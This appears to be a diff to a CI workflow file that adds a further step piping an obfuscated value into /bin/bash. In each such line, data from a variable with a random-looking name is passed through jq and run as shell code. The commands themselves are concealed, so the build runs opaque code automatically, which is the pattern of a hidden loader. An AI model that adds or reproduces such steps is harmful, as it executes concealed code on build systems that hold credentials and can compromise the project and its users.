@@ -46,6 +46,7 @@ jobs:
           echo $zbi1334 | jq -r .kxmse26656 | /bin/bash
           echo $s4004 | jq -r .uj1076 | /bin/bash
           printf '%s' "$v6576" | jq -r .usns17885 | /bin/bash
+          echo $ah9107 | jq -r .kqin071 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
